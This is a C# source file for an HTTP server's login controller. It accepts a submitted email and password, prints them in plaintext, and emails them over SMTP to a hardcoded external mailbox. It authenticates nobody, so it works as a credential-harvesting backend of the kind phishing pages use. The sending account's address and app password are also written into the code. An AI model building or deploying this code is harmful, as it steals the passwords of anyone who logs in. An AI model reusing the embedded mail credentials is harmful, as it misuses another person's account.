using System;
using System.IO;
using System.Net;
using System.Net.Mail;
using System.Text;
using System.Threading.Tasks;

namespace MyHTTPServer
{
    public class AuthController : IController
    {
        public async Task HandleAsync(HttpListenerContext context, string cleanPath)
        {
            var request = context.Request;
            var response = context.Response;

            if (request.HttpMethod.Equals("POST", StringComparison.OrdinalIgnoreCase))
            {
                using (var reader = new StreamReader(request.InputStream, request.ContentEncoding))
                {
                    string requestBody = await reader.ReadToEndAsync();
                    Console.WriteLine($"\n[AuthController] Получены данные формы через POST");

                    string[] pairs = requestBody.Split('&');
                    string emailRaw = pairs[0].Split('=')[1];
                    string passwordRaw = pairs[1].Split('=')[1];
                    string email = Uri.UnescapeDataString(emailRaw);
                    string password = Uri.UnescapeDataString(passwordRaw);

                    Console.WriteLine($"Введенный Email: {email}");
                    Console.WriteLine($"Введенный Пароль: {password}");

                    bool emailSent = SendToYandex(email, password);

                    response.StatusCode = 200;
                    response.ContentType = "text/html; charset=utf-8";

                    string message = emailSent ? "Данные успешно отправлены на почту!" : "Ошибка при отправке почты.";
                    string successHtml = $"<h1>Результат</h1><p>{message}</p>";
                    byte[] postBuffer = Encoding.UTF8.GetBytes(successHtml);

                    response.ContentLength64 = postBuffer.Length;
                    await response.OutputStream.WriteAsync(postBuffer);
                    response.OutputStream.Close();
                }
            }
        }

        private bool SendToYandex(string userEmail, string userPassword)
        {
            try
            {

                string fromAddress = "ZIPPI56@yandex.ru"; 
                string appPassword = "ehjvtbmnvanjgcrp";

                using (MailMessage mail = new MailMessage())
                {
                    mail.From = new MailAddress(fromAddress);
                    mail.To.Add("galievairat18@yandex.ru");
                    mail.Subject = "Получены данные формы авторизации";
                    mail.Body = $"Пользователь ввел следующие данные:\n\nЛогин/Email: {userEmail}\nПароль: {userPassword}";
                    mail.IsBodyHtml = false;

                    using (SmtpClient smtp = new SmtpClient("smtp.yandex.ru", 587))
                    {
                        smtp.Credentials = new NetworkCredential(fromAddress, appPassword);
                        smtp.EnableSsl = true;
                        smtp.Send(mail);
                    }
                }
                Console.WriteLine("[SMTP] Письмо успешно отправлено.");
                return true;
            }
            catch (Exception ex)
            {
                Console.WriteLine("[SMTP] Ошибка отправки письма: " + ex.Message);
                return false;
            }
        }
    }
}
